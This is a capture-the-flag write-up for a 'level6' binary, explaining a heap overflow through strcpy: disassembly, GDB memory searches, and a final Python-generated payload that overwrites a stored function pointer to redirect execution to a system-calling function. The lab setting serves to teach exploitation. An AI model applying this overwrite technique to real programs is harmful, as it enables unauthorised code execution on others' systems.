# Write up

Through a quick check of the `level6` dissassembled code, we notice that the call address in stored in the eax register :
```
 80484a5:	ba 68 84 04 08       	mov    edx,0x8048468
 ...
 80484b8:	89 c2                	mov    edx,eax
 ...
 80484d0:	ff d0                	call   eax
```
Which calls a m function writing "Nope", we also have a n function calling system.
We have two malloc calls, one with a size of 64, the other with a size of 4.
We check a dummy payload to check the allocated size and get a segfault with 72 chars :
```
./level6 "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
```
Which is as we expected (64 (1st malloc) + 4 (2nd malloc) + 4 offset bytes).
The stack here contains the pointer values (RAM addresses) for the allocated pointers in the heap.
Lets look those lines more closely :

```
 80484a5:	ba 68 84 04 08       	mov    edx,0x8048468
 80484aa:	8b 44 24 18          	mov    eax,DWORD PTR [esp+0x18]
 80484ae:	89 10                	mov    DWORD PTR [eax],edx
  ...
 80484ca:	8b 44 24 18          	mov    eax,DWORD PTR [esp+0x18]
 80484ce:	8b 00                	mov    eax,DWORD PTR [eax]
 80484d0:	ff d0                	call   eax
```
`esp+0x18` Contains here the 4 bytes malloc'ed address, which content is set to the `m` function address, this value is not meant no be changed.
By exploiting a Heap overflow through the strcpy call, we will have to change this value contents.
With GDB we search for the heap address by putting a break point after the malloc calls :
```
gdb ./level6
(gdb) break* 0x80484c5
(gdb) run AAAA
(gdb) info proc map
  ...
0x804a000  0x806b000    0x21000        0x0 [heap]
  ...
(gdb) x/120x 0x804a000
 ...
0x804a040:      0x00000000      0x00000000      0x00000000      0x00000011
0x804a050:      0x08048468      0x00000000      0x00000000      0x00020fa9
0x804a060:      0x00000000      0x00000000      0x00000000      0x00000000
 ...
(gdb) find 0x804a000, 0x806b000, 0x08048468
0x804a050
warning: Unable to access target memory at 0x8069454, halting search.
1 pattern found.
```
Very interesting, we found our call address here which is stored at `0x804a050`.
However, we didn't found our AAAA (0x41414141) string, we have to put another breakpoint after the strcpy call, for example at the `0x80484d0` address.
```
(gdb) find 0x804a000, 0x806b000, 0x41414141
0x804a008
warning: Unable to access target memory at 0x806940c, halting search.
1 pattern found.
```
Bingo, we now know that after the 72nd char we start to overwrite the m address.
The following payload gives us the flag :
```
./level6 $(python -c "print 'A' * 72 + '\x54\x84\x04\x08'")
```

## Sources

https://samsclass.info/127/proj/p7-heap0.htm